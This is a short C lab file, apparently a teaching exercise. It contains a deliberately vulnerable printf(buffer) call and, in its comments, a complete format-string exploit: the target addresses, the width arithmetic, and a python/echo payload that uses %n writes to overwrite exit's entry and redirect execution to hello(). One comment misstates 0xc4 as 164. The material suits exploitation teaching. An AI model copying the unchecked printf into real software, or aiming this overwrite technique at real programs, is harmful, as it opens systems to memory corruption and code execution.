#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

// Compile with: gcc -m32 example8.c -o example8

void hello() { 
    printf("code execution redirected! you win\n"); 
    _exit(1); 
}

void vuln() {
    char buffer[512];
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);
    printf("about to call: %p\n", &exit);
    exit(1);
}

int main(int argc, char **argv) { 
    vuln(); 
}

// hello == 0x080484c4
// exit  == 0x0804a014

// Hello byte 4 = c4 = 164	: 4+4+4+4+x              = 196 (0xc4)  : x = 180
// Hello byte 3 = 84 = 132	: 4+4+4+4+180+x          = 388 (0x184) : x = 192
// Hello byte 2 = 04 = 4	: 4+4+4+4+180+192+x      = 516 (0x204) : x = 128
// Hello byte 1 = 08 = 8	: 4+4+4+4+180+192+128+x  = 520 (0x208) : x = 4

// echo `python -c 'print "\x14\xa0\x04\x08" + "\x15\xa0\x04\x08" + "\x16\xa0\x04\x08" + "\x17\xa0\x04\x08" + "%1$0180x%7$n" + "%1$0192x%8$n" + "%1$0128x%9$n" + "%1$04x%10$n"'` | ./example8
